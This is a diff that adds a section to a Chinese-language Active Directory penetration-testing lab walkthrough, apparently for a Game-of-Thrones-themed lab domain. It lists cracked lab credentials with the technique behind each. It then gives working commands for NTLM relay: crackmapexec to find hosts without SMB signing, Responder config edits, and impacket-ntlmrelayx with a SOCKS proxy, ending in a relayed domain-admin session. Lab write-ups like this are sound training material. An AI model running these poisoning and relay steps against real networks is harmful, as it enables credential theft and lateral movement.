@@ -77,4 +77,66 @@ Eddard的密码比较强，用这个方法是破解不了的
 
 > 如果要删除以前捕获的日志（消息跳过以前捕获的哈希）删除文件 /opt/tools/Responder/Responder.db
 
+目前获取的凭据：
+* north.sevenkingdoms.local\samwell.tarly:Heartsbane（用户描述）
+
+* north.sevenkingdoms.local\brandon.stark:iseedeadpeople（AS-REP Roasting）
+
+* north.sevenkingdoms.local\hodor:hodor（密码喷洒）
+
+* north.sevenkingdoms.local\jon.snow:iknownothing（Kerberoasting）
+
+* north.sevenkingdoms.local\robb.stark:sexywolfy （Responder）
+
 ## NTLM Relay
+
+首先找到signing:False的服务器
+```bash
+crackmapexec smb 192.168.56.10-23 --gen-relay-list relay.txt
+```
+接下来尝试将ntlm认证中继到这些服务器
+
+### responder + ntlmrelayx to smb
+
+在启动responder对 LLMNR、MDNS 和 NBT-NS 请求的回复投毒之前，我们必须停止 responder监听smb 和 http 服务器，因为我们不想直接获取哈希值，但我们想将它们中继到 ntlmrelayx
+
+```bash
+sed -i 's/HTTP = On/HTTP = Off/g' /usr/share/responder/Responder.conf && cat /usr/share/responder/Responder.conf | grep --color=never 'HTTP ='
+```
+
+```bash
+HTTP = Off
+```
+```bash
+sed -i 's/SMB = On/SMB = Off/g' /usr/share/responder/Responder.conf && cat /usr/share/responder/Responder.conf | grep --color=never 'SMB ='
+```
+```bash
+SMB = Off
+```
+启动ntlmrelayx
+```bash
+sudo impacket-ntlmrelayx -tf relay.txt -of netntlm -smb2support -socks
+```
+启动
+
+* -tf：要中继身份验证的目标列表
+
+* -of：输出文件，这将保留捕获的SMB哈希，就像我们之前使用响应器所做的那样，以便以后破解它们
+
+* -smb2support：支持 SMB2
+
+* -socks：将启动袜子代理以使用中继身份验证
+
+```bash
+ntlmrelayx> socks
+Protocol  Target         Username            AdminStatus  Port 
+--------  -------------  ------------------  -----------  ----
+SMB       192.168.56.22  NORTH/EDDARD.STARK  TRUE         445  
+SMB       192.168.56.22  NORTH/ROBB.STARK    FALSE        445  
+SMB       192.168.56.23  NORTH/EDDARD.STARK  FALSE        445  
+SMB       192.168.56.23  NORTH/ROBB.STARK    FALSE        445  
+```
+* 投毒中继到了castelblack (192.168.56.22) 和 essos (192.168.56.23)，并设置了一个 socks 代理来使用该连接
+
+* 由于 eddard.stark 是 north.sevenkingdoms.local 的域管理员，他在 castelback (192.168.56.22) 上获得了管理员权限
+
